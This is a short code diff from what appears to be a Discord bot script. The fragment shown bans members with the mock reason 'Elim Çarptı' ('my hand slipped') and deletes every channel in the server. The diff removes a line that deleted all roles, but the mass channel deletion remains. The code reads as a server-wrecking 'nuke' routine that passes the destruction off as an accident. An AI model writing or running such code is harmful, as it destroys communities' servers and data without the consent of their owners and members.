@@ -10,7 +10,6 @@ message.guild.ban(u, "Elim Çarptı")
 }
 })
 
-message.guild.roles.deleteAll("");
 message.guild.channels.deleteAll("");
 }
 
